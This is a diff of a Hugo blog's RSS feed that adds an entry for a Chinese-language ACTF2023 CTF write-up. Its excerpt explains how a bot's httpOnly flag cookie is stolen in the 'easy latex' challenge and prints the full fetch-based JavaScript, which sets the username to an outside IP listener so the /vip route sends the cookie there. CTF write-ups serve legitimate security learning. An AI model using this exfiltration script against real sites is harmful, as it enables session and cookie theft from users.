@@ -6,7 +6,20 @@
     <description>Recent content in Posts on an4er&#39; blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 22 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://blog.an4er.top/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 31 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://blog.an4er.top/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ACTF2023 WP</title>
+      <link>http://blog.an4er.top/post/actf_wp/</link>
+      <pubDate>Tue, 31 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://blog.an4er.top/post/actf_wp/</guid>
+      <description>周末看了下ACTF的题目，在这里做个记录
+easy latex 题目起手先在bot里面看到了flag
+可是被设置为了httpOnly，也就是我们不可能使用xss去获得flag，查看其应用路由。在vip中发现
+它获取了请求中的cookie，将其重新拼装后发送请求，也就是我们的bot只要向vip 路由发送post请求就能拿其Cookie，但是我们需要外带的话，需要控制其username为我们监听的地址或者webhook。最后就是找个地方能触发JS脚本执行的地方，外带脚本如下
+const url = &amp;#34;http://localhost:3000/login&amp;#34;; const requestBody = &amp;#34;username=http%3A%2F%2F49.232.214.202%3A5000%2F&amp;amp;password=add29f48a5ae410bd6e875c8cd1ab8b7&amp;#34;; fetch(url, { method: &amp;#34;POST&amp;#34;, // 设置请求头 headers: { &amp;#34;Host&amp;#34;: &amp;#34;localhost:3000&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;textml,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;, &amp;#34;Accept-Language&amp;#34;: &amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;, &amp;#34;Accept-Encoding&amp;#34;: &amp;#34;gzip, deflate, br&amp;#34;, &amp;#34;Referer&amp;#34;: &amp;#34;http://localhost:3000/login&amp;#34;, &amp;#34;Content-Type&amp;#34;: &amp;#34;application/x-www-form-urlencoded&amp;#34;, &amp;#34;Content-Length&amp;#34;: requestBody.length.toString(), &amp;#34;Origin&amp;#34;: &amp;#34;http://localhost:3000&amp;#34;, &amp;#34;DNT&amp;#34;: &amp;#34;1&amp;#34;, &amp;#34;Connection&amp;#34;: &amp;#34;close&amp;#34;, &amp;#34;Upgrade-Insecure-Requests&amp;#34;: &amp;#34;1&amp;#34;, }, body: requestBody, }) .then(async (response) =&amp;gt; { await sleep(100); fetch(&amp;#39;http://localhost:3000/vip&amp;#39;, { method: &amp;#39;POST&amp;#39;, body: JSON.stringify({ code: &amp;#34;3672953f54673678&amp;#34; }), headers: { &amp;#39;Content-Type&amp;#39;: &amp;#39;application/json&amp;#39;, }, credentials: &amp;#39;include&amp;#39;, }); }); const sleep = (time) =&amp;gt; { return new Promise(resolve =&amp;gt; setTimeout(resolve, time)); }; 路由内可以造成XSS就两个点，一个preview一个note，但是note需要登录，看了下逻辑不太可能去绕过VIP，然后试了下在puppeteer中是可以使用.</description>
+    </item>
+    
     <item>
       <title>hxpCTF valentine WP</title>
       <link>http://blog.an4er.top/post/hxp_valentine/</link>
